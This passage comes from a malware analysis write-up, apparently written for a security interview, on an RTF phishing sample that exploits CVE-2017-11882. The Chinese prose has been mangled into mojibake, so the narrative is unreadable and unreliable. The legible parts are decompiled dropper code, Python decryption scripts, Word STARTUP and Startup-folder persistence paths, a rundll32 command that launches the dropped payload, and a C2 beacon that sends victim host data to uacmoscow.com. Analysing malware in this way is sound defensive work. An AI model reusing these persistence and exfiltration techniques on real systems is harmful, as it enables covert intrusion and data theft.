        é€™ä¸€æ®µæ‡‰è©²å°±æ˜¯åœ¨decryptå¾ŒçºŒçš„shellcodeï¼Œå¯ä»¥çœ‹åˆ°ä»–ä¸æ–·loopåšä¸€ä»¶äº‹æƒ…ï¼Œé‚£å°±æ˜¯XORç›®å‰å–å¾—çš„word bytes(0xC390)ï¼Œç¸½å…±æ‡‰è©²åšäº†0x8BAæ¬¡ï¼Œæ¯æ¬¡æ”¹2 Bytes
        ![åœ–ç‰‡](https://hackmd.io/_uploads/S1gLGp8ap.png)
        å¯ä»¥çœ‹åˆ°decryptå¾Œå°±çœŸçš„èƒ½è¾¨è­˜ä¸€äº›å­—å…ƒ
        ![åœ–ç‰‡](https://hackmd.io/_uploads/rJtgETLpT.png)
        decryptå®Œçš„codeæˆªåœ–å¦‚ä¸‹ï¼Œé€™æ‰æ˜¯çœŸæ­£çš„shellcode
        ![åœ–ç‰‡](https://hackmd.io/_uploads/BJb9w6Lpp.png)
    * åšçš„äº‹æƒ…å¦‚ä¸‹
        1. è§£æå‡º`ntdll.dll`å’Œ`kernelbase.dll`
            é€™ä¸€æ®µå¾ˆæœ‰è¶£ï¼Œä»–æ‡‰è©²å°±æ˜¯æˆ‘åœ¨[2023 Lab - WinMalware - Dynamic API Resolution Background](https://hackmd.io/@SBK6401/Bkd51XRM6)ä¸­å­¸åˆ°çš„API ResolutionæŠ€å·§
            > ä¸é  loaderï¼Œåœ¨ runtime è‡ªè¡Œçˆ¬å–ç³»çµ±çµæ§‹ï¼Œå–å¾—æ‰€éœ€çš„ Windows API
            
            ![åœ–ç‰‡](https://hackmd.io/_uploads/HygbsTU6T.png)
            ç¬¬ä¸€å€‹ä½¿ç”¨çš„dllæ˜¯`msvcrt.dll`ï¼Œä»¥æ­¤é¡æ¨ï¼Œæˆ‘å€‘å¯ä»¥æŠŠä¸‹ä¸€å€‹functionç•¶ä½œæ˜¯åœ¨çˆ¬`kernel32.dll`
            ![åœ–ç‰‡](https://hackmd.io/_uploads/Syb5TpITT.png)
        2. Fetch API
            é€™å€‹æ˜¯æˆ‘çœ‹åˆ°ç†Ÿæ‚‰çš„è€æœ‹å‹â†’Magic Header(MZå’ŒPEå­—æ¨£)ï¼Œå…¶å¯¦é€™ä¸€æ®µå°±æ˜¯åœ¨fetchå„å€‹dll fileçš„API(åªè¦çµ¦å®šdllçš„fileç•¶ä½œåƒæ•¸çµ¦é€™å€‹functionï¼Œå°±å¯ä»¥çˆ¬åˆ°æƒ³è¦çš„API)ï¼Œæˆ‘è‡ªå·±çœ‹åˆ°çš„ç¸½å…±æœ‰ä»¥ä¸‹å€‹: 
            ```bash
            GetProcAddresss->kernel32.dll
            VirtualProtext->kernel32.dll
            clearerr->ucrtbase.dll
            CreateFileA->kernel32.dll
            GetFileSize->kernel32.dll
            ReadFile->kernel32.dll
            WriteFile->kernel32.dll
            CloseHandle->kernel32.dll
            CreateProcessA->kernel32.dll
            GetModuleFileNameA->kernel32.dll
            ResumeThread->kernel32.dll
            TerminateProcess->kernel32.dll
            ---
            GetThreadContext->kernel32.dll
            ReadProcessMemory->kernel32.dll
            GetModuleHandleA->kernel32.dll
            WriteProcessMemory->kernel32.dll
            SetThreadContext->kernel32.dll
            ZwUnmapViewOfSection->ntdll.dll
            ```
            ![åœ–ç‰‡](https://hackmd.io/_uploads/S108gJvTa.png)
        3. CreateFile & VitualAlloc & Decrypt
            Fetchå®ŒAPIå¾Œï¼Œä»–å°±Create `C:\Users\REM\AppData\Local\Temp\8.t`
            ![åœ–ç‰‡](https://hackmd.io/_uploads/HkCUTDda6.png)
            ä¸¦ä¸”å–å¾—ä»–çš„å¤§å°å¾Œé–‹ä¸€å€‹åŒæ¨£å¤§å°çš„ç©ºé–“çµ¦current processï¼Œæ¥è‘—ä»–ç”¨ReadFileæŠŠè®€å–å€’çš„æ‰€æœ‰å…§å®¹æ”¾åˆ°è©²ç©ºé–“ä¸­
            ![åœ–ç‰‡](https://hackmd.io/_uploads/ryuB0vdTa.png)
            å–å®Œè³‡æ–™å¾Œå¦‚ä¸‹
            ![åœ–ç‰‡](https://hackmd.io/_uploads/Sk6wRvu6T.png)
            ReadFileå®Œå¾Œå°±é–‹å§‹è§£å¯†åŸæœ¬çš„å…§å®¹ï¼Œè©³ç´°çš„è§£å¯†éç¨‹å¦‚ä¸‹(ä¸€æ•´å¤§æ®µéƒ½æ˜¯):
            ![åœ–ç‰‡](https://hackmd.io/_uploads/rJj2d_Op6.png)
            :::spoiler Psudo Code
            ```python!
            from Crypto.Util.number import long_to_bytes
            data = open('./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t', 'rb').read()
            key = 0x48B53A6C
            idx = 0
            file_size = len(data)
            decrypt_data = b""
            if file_size > 0:
                while idx < file_size:
                    ebx = 7
                    while ebx > 0:
                        ecx = key >> 26
                        ecx ^= key
                        ecx >>= 3
                        ecx ^= key
                        key *= 2
                        if key > 0x100000000:
                            key -= 0x100000000
                        ecx &= 1
                        key |= ecx
                        key += 1
                        ebx -= 1
                    decrypt_data += long_to_bytes(data[idx] ^ (key & 0xFF))

                    idx += 1
            open('./8.t_decrypt', 'wb').write(decrypt_data)
            ```
            :::
        4. CreateFile & WriteFile
            æ¥è‘—ä»–å‰µäº†`C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`é€™å€‹fileå¿…ä¸”å¯«ä¸Šä¸€äº›æ±è¥¿ï¼Œå…¶å¯¦å°±æ˜¯æˆ‘å€‘å‰›å‰›decryptçš„æª”æ¡ˆ
            
6. Analyze intel.wll
    é¦–å…ˆä»–å…ˆDecryptå„²å­˜åœ¨å…§éƒ¨çš„åŸ·è¡Œæª”(æœ‰åŠ å¯†éçš„)ï¼Œç„¶å¾ŒæŠŠä»–å¯«åˆ°
    ```
    C:\Users\REM\AppData\Local\Temp\taskhost.exe
    ```
    é€™å€‹æª”æ¡ˆä¸­ï¼Œè§£å¯†å°±æ˜¯ä¸€å€‹äº†ç„¡æ–°æ„çš„XORï¼Œè§£å¯†çš„codeå¦‚ä¸‹:
    :::spoiler
    ```c
    void __cdecl CreateTask(LPCSTR lpFileName)
    {
      LPCVOID *lpBuffer; // edi
      HANDLE FileA; // ebp
      unsigned int i; // esi
      unsigned int counter; // eax
      _BYTE *v5; // ecx
      DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h] BYREF
                                                    // å¯«åˆ°Task.exeçš„å¤§å°ç¸½å…±æ˜¯0xB000ï¼Œæ¯ä¸€æ¬¡å¯«16bytes(è¨˜å¾—è¦å¾å¾Œé¢å¯«å›ä¾†)ï¼Œè¦å¯«2816æ¬¡
      lpBuffer = (LPCVOID *)operator new(16u);
      FileA = CreateFileA(lpFileName, GENERIC_WRITE, 0, 0, CREATE_NEW, 0, 0);
      if ( FileA != (HANDLE)-1 )
      {
        for ( i = 0; i < 2816; ++i )
        {
          counter = 0;
          v5 = (char *)&Enc_Task_exe + 16 * i + 15;
          do
            *((_BYTE *)lpBuffer + counter++) = *v5-- ^ 6;
          while ( counter < 0x10 );
          WriteFile(FileA, lpBuffer, 0x10u, &NumberOfBytesWritten, 0);
        }
        operator delete(lpBuffer);
        CloseHandle(FileA);
      }
    }
    ```
    :::
    æˆ‘ç°¡å–®çš„å¯«äº†ä¸€å€‹python scriptå»é©—è­‰ä»–ï¼Œå¦‚ä¸‹:
    :::spoiler
    ```python
    from Crypto.Util.number import long_to_bytes

    BUFFER_SIZE = 16
    num_iterations = 2816

    lpBuffer = b""
    unk_10005030 = open('Enc_Task_exe.txt', 'r').read().split(' ')
    FileA = open('Dec_Task_exe.txt', 'wb')

    # Loop through the iterations
    for i in range(num_iterations):
        counter = 15
        while counter >= 0:
            current_byte = unk_10005030[i * BUFFER_SIZE + counter]
            lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6)
            counter -= 1

    FileA.write(lpBuffer)
    ```
    :::
    åŒæ™‚ä»–ä¹Ÿcreateäº†ä¸€å€‹LNK fileåœ¨
    ```
    C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
    ```
    è©³ç´°çš„c codeå¦‚ä¸‹
    :::spoiler
    ```clike
    void CreateLNK(char *a1, char *a2, char *a3, char *a4, ...)
    {
      void *v4; // ecx
      bool v5; // sf
      int v6; // edx
      LPVOID ppv; // [esp+40h] [ebp-4h] BYREF
      void *retaddr; // [esp+44h] [ebp+0h]
      int v9; // [esp+58h] [ebp+14h]
      va_list va; // [esp+5Ch] [ebp+18h] BYREF

      va_start(va, a4);
      v9 = va_arg(va, _DWORD);
      ppv = v4;
      if ( CoInitialize(0) >= 0 )
      {
        if ( CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv) >= 0 )
        {
          (*(*ppv + 80))(ppv, a1, ppv);
          (*(*retaddr + 44))(retaddr, a3);
          (*(*retaddr + 68))(retaddr, v9, 0);
          (*(*retaddr + 60))(retaddr, 7);
          if ( (**retaddr)(retaddr, &unk_10004100, &a2) >= 0 )
          {
            v5 = (*(*a2 + 24))(a2, a4, 0) < 0;
            ppv = a2;
            v6 = *a2;
            if ( !v5 )
            {
              (*(v6 + 8))();
              (*(*ppv + 8))(ppv);
              CoUninitialize();
              return;
            }
            (*(v6 + 8))(ppv);
          }
          (*(*retaddr + 8))(retaddr);
        }
        CoUninitialize();
      }
    }
    ```
    :::
    é›–ç„¶çœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œä½†ç¸½ä¹‹é€™å€‹LNKå…§éƒ¨å„²å­˜çš„æ±è¥¿å¦‚ä¸‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç”¨rundll32.exeè·‘å‰›å‰›è§£å¯†çš„taskhost.exe:
    ```
    C:\WINDOWS\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\taskhost.exe
    ```
    åªè¦æ‰“é–‹å…§å®¹çœ‹ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œç•¶ç„¶å¦‚æœå¯ä»¥ç”¨å·¥å…·parseä¸€ä¸‹æœƒæ›´æº–ç¢ºï¼Œä½†ç¤™æ–¼æ™‚é–“çš„é—œä¿‚å°±å…ˆå¾€ä¸‹åˆ†æ
    ![åœ–ç‰‡](https://hackmd.io/_uploads/HypaHtKa6.png)

7. Analyze taskhost.exe
    è«‹æŸ¥é–±å¾Œé–€åŠŸèƒ½é€™å€‹Section



### é€šè¨Šå”å®š
å› ç‚ºæˆ‘æ²’æœ‰å¯¦éš›æ¶ä¸€å€‹serverè®“ä»–é€£ç·šï¼Œæ‰€ä»¥æˆ‘æ˜¯ç›´æ¥éŒ„ä¸€å€‹å¤±æ•—çš„connectionï¼Œçœ‹ä»–ä¸Ÿäº†ä»€éº¼å‡ºä¾†
![åœ–ç‰‡](https://hackmd.io/_uploads/rkwPnVcT6.png)
:::danger
å¦‚æœä¹‹å¾Œé‚„æœ‰æ™‚é–“å¯ä»¥æƒ³è¾¦æ³•æ¶ä¸€å€‹C2 Serverï¼Œå¯¦éš›å»æ§‹é€ é€£ç·šçš„å°åŒ…
:::

### åŠ è§£å¯†æ¼”ç®—æ³•
å¦‚ä¸Šæ‰€è¿°

### å¾Œé–€åŠŸèƒ½
å…ˆèªªæ˜ä¸€ä¸‹é€™å€‹å¾Œé–€åœ¨å¹¹éº»ï¼Œé †ä¸€ä¸‹æµç¨‹
1. åœ¨main functionä¸­å¯¦ä½œäº†ä¸€å€‹MD5 hash functionï¼Œä¸¦ä¸”å¾0é–‹å§‹ç®—ç›´åˆ°ç¬¦åˆ`ef775988943825d2871e1cfa75473ec0`ï¼Œå…¶å¯¦é€™å€‹å°±æ˜¯99999999ï¼Œæˆ‘ä¸å¤ªç¢ºå®šé€™ä¸€æ®µç‚ºä»€éº¼è¦åšé€™ä»¶äº‹ï¼Œå¯èƒ½çš„åŸå› æˆ‘æƒ³æœ‰å…©å€‹ï¼Œå…¶ä¸€æ˜¯æƒ³è¦åšåˆ°PoWçš„æ•ˆæœï¼Œå…¶äºŒæ˜¯ä¸æƒ³è¦å¤ªå¿«åŸ·è¡Œåˆ°é—œéµçš„åœ°æ–¹ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥æ”¾ä¸‹æˆ’å¿ƒï¼Œä½†å…©å€‹åŸå› éƒ½ä¸å¤ªèƒ½èªªæœè‡ªå·±å°±æ˜¯äº†
2. æ¥è‘—ä»–decodeå‡ºäº†é¡ä¼¼portçš„1228é€™å€‹æ•¸å­—å’ŒC2 server name:==uacmoscow.com==ï¼Œæˆ‘ä¸å¤ªç¢ºå®šé€™å€‹1228æ˜¯å¹¹å˜›çš„
3. æ¥è‘—é€²å…¥åˆ°while loopæƒ³è¾¦æ³•fetchåˆ°é›»è…¦çš„ä¸€äº›è³‡è¨Š:
    1. Local IP
    2. OEM Code
    3. Tick Count(å¾é–‹æ©Ÿæ™‚é–“é–‹å§‹åˆ°ç¾åœ¨éäº†å¤šä¹…)
    4. ç›®å‰é›»è…¦çš„æ¶æ§‹æ˜¯å¤šå°‘
    5. OSç‰ˆæœ¬
    6. Domain Name
    7. Username
    8. Computer Name
    9. Proxy Serveræœ‰ç„¡é–‹å•Ÿ
4. å…ˆçµ„ç¹”å¥½URIâ†’`/ru/order/index.php?strPageID=2396956864`ï¼Œä»¥æˆ‘çš„VMç‚ºä¾‹ï¼Œæˆ‘çš„IPæ˜¯`192.168.222.142`ï¼Œæ›ç®—æˆhexå°±æ˜¯`0x8edea8c0`
5. ç”¨base32 encodeå‰é¢å¾—åˆ°çš„æ‰€æœ‰é›»è…¦è³‡è¨Šï¼Œä»¥æˆ‘çš„VMç‚ºä¾‹: `KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===`
6. å»ºæ§‹å°åŒ…:
    ```
    Host: uacmoscow.com
    Connection: keep-alive
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
    Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===
    ```
7. å˜—è©¦ç”¨Getæ–¹å¼å‚³é€å‡ºå»ï¼Œä½†æ˜¯å› ç‚ºé€™å€‹domainæ›äº†ï¼Œæ‰€ä»¥æœ‰é—œæ–¼é€£ç·šçš„åœ°æ–¹å¤§éƒ¨åˆ†éƒ½æ˜¯éœæ…‹å»çœ‹
8. å¦‚æœé€£ç·šæˆåŠŸä»–å°±å¯ä»¥åŸ·è¡Œä»¥ä¸‹å¹¾ä»¶äº‹æƒ…:
    1. ç²å–æ‰€æœ‰ç›®å‰processçš„ç›¸é—œè³‡è¨Šå¾Œï¼Œåˆ©ç”¨Postå‚³é€å‡ºå»â†’`/xhome.native.page/datareader.php?sid=2396956864`
    2. çµ‚æ­¢Process
    3. é–‹Shell
    4. å¾Serverå‚³é€è³‡æ–™åˆ°Local

### å¸¸é§æ–¹å¼
ç›®å‰æˆ‘çœ‹åˆ°çš„éƒ¨åˆ†å°±åªæœ‰å‰µäº†ä»¥ä¸‹å…©å€‹æª”æ¡ˆï¼Œå‰è€…æ˜¯åªè¦victimæ‰“é–‹wordå°±æœƒè§¸ç™¼åˆ°çš„æ©Ÿç½®ï¼Œå¾Œè€…å‰‡æ˜¯ç•¶ç”¨æˆ¶ç™»éŒ„åˆ° Windows ç³»çµ±æ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•æª¢æŸ¥é€™å€‹ç›®éŒ„ï¼Œä¸¦é‹è¡Œå…¶ä¸­çš„ç¨‹åºæˆ–å¿«æ·æ–¹å¼
```
C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll
C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
```

## ä¸­ç¹¼ç«™

### åŸºæœ¬è³‡è¨Š
IP: `58.158.177.102`
Domain: `uacmoscow.com`

### é—œé€£è³‡è¨Š
è©²IPå¯èƒ½ä¾†æºæ–¼æ—¥æœ¬
![åœ–ç‰‡](https://hackmd.io/_uploads/SyKjnVcTp.png)
:::danger
æ ¹æ“šé¢è©¦å®˜çš„èªªæ˜ï¼Œé€™å€‹IPå·²ç¶“è¢«è³‡å®‰å…¬å¸è¨»å†Šäº†ï¼Œè®Šæˆå¦‚æœæœ‰Victimé€£ç·šåˆ°é€™å€‹IPï¼Œè³‡å®‰å…¬å¸å°±æœƒç›´æ¥é€šçŸ¥ï¼Œä»¥ä¾¿åšå¾ŒçºŒçš„IRæˆ–æ˜¯é˜²æ­¢æ›´å¤§ç¯„åœçš„å—å®³
:::

## å¨è„…æƒ…è³‡

### æ”»æ“Šè€…
ä¸ç¢ºå®š

### æ”»æ“Šæ™‚é–“
ä¸ç¢ºå®š

### å—å®³è€…
ä¸ç¢ºå®š
:::danger
å¦‚æœæŠŠRTFçš„å…§å®¹å¯¦éš›æ‰“é–‹å»çœ‹è£¡é¢çš„å…§å®¹ï¼Œæœƒç™¼ç¾æ˜¯ä¸€å€‹æœƒè­°ç´€éŒ„ï¼Œå¦‚æœå†æ›´è©³ç´°çš„OSINTå¯èƒ½å¯ä»¥é‡å°é€™ä¸€é»å»çœ‹æœ‰å¯èƒ½çš„å—å®³è€…æ˜¯èª°
:::

# Reference
* [Any.Run Analyze Phishing Mail](https://app.any.run/tasks/af6d9ed7-875e-43d9-a2ea-f3edadd32132/#)
* [æŸå€‹ä»¥é‡£é­šéƒµä»¶ç™¼èµ·çš„ APT æ”»æ“Š](https://ruhunglee.github.io/malware/ml01/)

[^rtf]:[å¯Œæ–‡æœ¬æ ¼å¼](https://www.jendow.com.tw/wiki/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F)
[^xlam]:[ä»€éº¼æ˜¯XLAMæ–‡ä»¶æ“´å±•åï¼Ÿ](https://www.solvusoft.com/en/file-extensions/file-extension-xlam/)
[^vba]:[Excelå¦‚ä½•æŸ¥çœ‹VBAä»£ç ï¼Ÿ](https://jingyan.baidu.com/article/d5c4b52b13c12c9b570dc507.html)
[^vba-excel]:[ Excelæ•™ç¨‹å°ç™½å¿…å­¦æŠ€å·§ 20ï¼šè°ƒå‡ºå¼€å‘å·¥å…·é€‰é¡¹å¡ ](https://youtu.be/ZOALFkVau8c?si=N_Jp4k1NR15LZGDY)
[^virustotla-cve-2017-11882]:[VirusTotal CVE-2017-11882](https://www.virustotal.com/gui/file/5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9/community)
[^rtf-wp1]:[CVE-2017-11882 Officeæ£§æº¢å‡ºæ¼æ´åˆ†æ](https://xz.aliyun.com/t/6668?time__1311=n4%2BxnD0DRDBGitDkDcexlhje0%3D06SOkShx7Ibx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
[^rtf-wp2]:[Officeç³»åˆ—æ¼æ´ä¹‹CVE-2017-11882](https://www.freebuf.com/column/183551.html)